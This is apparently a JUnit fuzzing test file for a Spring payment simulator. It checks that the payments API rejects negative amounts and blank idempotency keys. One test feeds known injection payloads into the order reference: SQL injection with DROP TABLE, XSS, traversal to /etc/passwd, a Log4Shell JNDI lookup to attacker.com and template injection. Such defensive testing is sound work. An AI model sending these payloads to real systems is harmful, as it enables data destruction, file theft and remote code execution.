package com.dwpg.simulator.fuzzing;

import com.dwpg.simulator.dto.PaymentRequest;
import com.dwpg.simulator.entity.Role;
import com.dwpg.simulator.entity.User;
import com.dwpg.simulator.entity.Wallet;
import com.dwpg.simulator.repository.*;
import com.dwpg.simulator.security.JwtTokenProvider;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import java.math.BigDecimal;
import java.util.UUID;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class PaymentInputFuzzingTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private WalletRepository walletRepository;

    @Autowired
    private MerchantRepository merchantRepository;

    @Autowired
    private PaymentRepository paymentRepository;

    @Autowired
    private RefundRepository refundRepository;

    @Autowired
    private TransactionRepository transactionRepository;

    @Autowired
    private IdempotencyRecordRepository idempotencyRecordRepository;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    private String userToken;

    @BeforeEach
    void setUp() {
        refundRepository.deleteAll();
        transactionRepository.deleteAll();
        paymentRepository.deleteAll();
        idempotencyRecordRepository.deleteAll();
        merchantRepository.deleteAll();
        walletRepository.deleteAll();
        userRepository.deleteAll();

        User user = new User("fuzz_user", "fuzz@test.com", "hash", Role.ROLE_USER);
        user = userRepository.save(user);
        Wallet wallet = new Wallet(user, BigDecimal.valueOf(1000.00), "USD");
        walletRepository.save(wallet);

        userToken = "Bearer " + jwtTokenProvider.generateToken("fuzz_user", "ROLE_USER");
    }

    @ParameterizedTest
    @ValueSource(strings = {"-500.00", "-0.01", "0.00", "-999999999.99"})
    @DisplayName("Fuzzing Test: Malformed & Negative Amounts must be rejected with 400 Bad Request")
    void testFuzzingInvalidAmounts(String amountStr) throws Exception {
        BigDecimal fuzzedAmount = new BigDecimal(amountStr);
        PaymentRequest req = new PaymentRequest(1L, fuzzedAmount, "ORD-FUZZ", "USD");

        mockMvc.perform(post("/api/payments")
                        .header("Authorization", userToken)
                        .header("Idempotency-Key", "fuzz-key-" + UUID.randomUUID())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req)))
                .andExpect(status().isBadRequest());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "' OR '1'='1",
            "'; DROP TABLE payments; --",
            "<script>alert('XSS')</script>",
            "../../../../etc/passwd",
            "%00%2e%2e%2f",
            "${jndi:ldap://attacker.com/exploit}",
            "{{7*7}}"
    })
    @DisplayName("Fuzzing Test: Injection Probes in Order Reference handled safely without 500 error or SQLi")
    void testFuzzingInjectionInOrderReference(String injectionPayload) throws Exception {
        PaymentRequest req = new PaymentRequest(999999L, BigDecimal.valueOf(10.00), injectionPayload, "USD");

        mockMvc.perform(post("/api/payments")
                        .header("Authorization", userToken)
                        .header("Idempotency-Key", "fuzz-key-" + UUID.randomUUID())
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req)))
                .andExpect(status().is4xxClientError());
    }

    @Test
    @DisplayName("Fuzzing Test: Missing or Blank Idempotency-Key header rejected with 400 Bad Request")
    void testFuzzingMissingIdempotencyKey() throws Exception {
        PaymentRequest req = new PaymentRequest(1L, BigDecimal.valueOf(10.00), "ORD-FUZZ", "USD");

        mockMvc.perform(post("/api/payments")
                        .header("Authorization", userToken)
                        .header("Idempotency-Key", "   ")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(req)))
                .andExpect(status().isBadRequest());
    }
}
